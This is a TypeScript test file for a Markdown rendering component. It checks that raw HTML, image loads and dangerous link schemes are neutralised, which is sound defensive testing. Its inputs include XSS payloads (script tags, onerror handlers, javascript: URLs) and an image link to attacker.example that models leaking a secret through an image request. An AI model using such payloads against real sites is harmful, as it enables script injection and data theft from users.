import { cleanup, render } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { MarkdownView } from "./index";

function allAttributeNames(root: Element): string[] {
  const names: string[] = [];
  const els = [root, ...Array.from(root.querySelectorAll("*"))];
  for (const el of els) for (const a of Array.from(el.attributes)) names.push(a.name);
  return names;
}

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

describe("MDR-02 Raw HTML is never interpreted", () => {
  it("Script and event-handler markup: no elements, no handlers, literal text shown", () => {
    const alertSpy = vi.fn();
    vi.stubGlobal("alert", alertSpy);
    const source = [
      "<script>alert(1)</script>",
      "",
      "<img src=x onerror=alert(1)>",
      "",
      'inline <iframe src="https://example.com"></iframe> end',
    ].join("\n");
    const { container } = render(<MarkdownView source={source} />);

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(allAttributeNames(container).filter((n) => n.toLowerCase().startsWith("on"))).toEqual([]);
    expect(alertSpy).not.toHaveBeenCalled();

    const text = container.textContent ?? "";
    expect(text).toContain("<script>alert(1)</script>");
    expect(text).toContain("<img src=x onerror=alert(1)>");
    expect(text).toContain('<iframe src="https://example.com">');
  });
});

describe("MDR-03 Images are never loaded", () => {
  // Structural assertions (no img element, URL absent from markup) are the primary check.
  // Request instrumentation below is supplementary: jsdom does not load resources by default.
  let fetchStub: ReturnType<typeof vi.fn>;
  let imageCtor: ReturnType<typeof vi.fn>;
  let srcSetter: ReturnType<typeof vi.fn>;
  let setAttrSpy: ReturnType<typeof vi.spyOn>;
  let originalSrc: PropertyDescriptor | undefined;

  beforeEach(() => {
    fetchStub = vi.fn();
    vi.stubGlobal("fetch", fetchStub);
    imageCtor = vi.fn();
    vi.stubGlobal("Image", imageCtor);
    srcSetter = vi.fn();
    originalSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, "src");
    Object.defineProperty(HTMLImageElement.prototype, "src", {
      configurable: true,
      get: () => "",
      set: srcSetter,
    });
    setAttrSpy = vi.spyOn(Element.prototype, "setAttribute");
  });

  afterEach(() => {
    if (originalSrc) Object.defineProperty(HTMLImageElement.prototype, "src", originalSrc);
    else delete (HTMLImageElement.prototype as unknown as Record<string, unknown>).src;
  });

  it("Image used to exfiltrate data: no img, no request, alt text shown", () => {
    const url = "https://attacker.example/p.png?leak=secret";
    const { container } = render(<MarkdownView source={`![logo](${url})`} />);

    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(fetchStub).not.toHaveBeenCalled();
    expect(imageCtor).not.toHaveBeenCalled();
    expect(srcSetter).not.toHaveBeenCalled();
    expect(setAttrSpy.mock.calls.filter(([n]) => String(n).toLowerCase() === "src")).toEqual([]);
    const text = container.textContent ?? "";
    expect(text).toContain("logo");
    expect(text).not.toContain("attacker.example");
    expect(text).not.toContain("![");
  });
});

describe("MDR-04 Restricted links", () => {
  it("Allowed link: https link with required rel", () => {
    const { container } = render(<MarkdownView source="[docs](https://example.com/a)" />);
    const a = container.querySelector("a");
    expect(a).not.toBeNull();
    expect(a!.getAttribute("href")).toBe("https://example.com/a");
    expect(a!.getAttribute("rel")).toBe("noopener noreferrer nofollow");
    expect(a!.textContent).toBe("docs");
  });

  it("Allowed link: http and mailto render as links with required rel", () => {
    const { container } = render(
      <MarkdownView source="[a](http://example.com/x) and [m](mailto:me@example.com)" />,
    );
    const anchors = Array.from(container.querySelectorAll("a"));
    expect(anchors.map((a) => a.getAttribute("href"))).toEqual([
      "http://example.com/x",
      "mailto:me@example.com",
    ]);
    for (const a of anchors) expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow");
  });

  it.each([
    ["javascript:", "javascript:alert(1)"],
    ["JavaScript: mixed case", "JaVaScRiPt:alert(1)"],
    ["JAVASCRIPT: upper case", "JAVASCRIPT:alert(1)"],
    ["leading whitespace javascript: (angle-bracket destination)", "< javascript:alert(1)>"],
    ["data:", "data:text/html,hi"],
    ["DATA: upper case", "DATA:text/html,hi"],
    ["vbscript:", "vbscript:msgbox(1)"],
    ["VBScript: mixed case", "VBScript:msgbox(1)"],
    ["file:", "file:///etc/passwd"],
    ["FILE: upper case", "FILE:///etc/passwd"],
    ["relative path", "/relative/path"],
    ["relative path without slash", "relative/page.html"],
    ["protocol-relative", "//example.com/x"],
  ])("Dangerous or relative link: %s renders text only", (_label, dest) => {
    const { container } = render(<MarkdownView source={`[linktext](${dest})`} />);
    expect(container.querySelectorAll("a")).toHaveLength(0);
    expect(container.querySelector("[href]")).toBeNull();
    const text = container.textContent ?? "";
    expect(text).toContain("linktext");
    expect(text).not.toContain(dest.replace(/^<|>$/g, "").trim());
  });
});
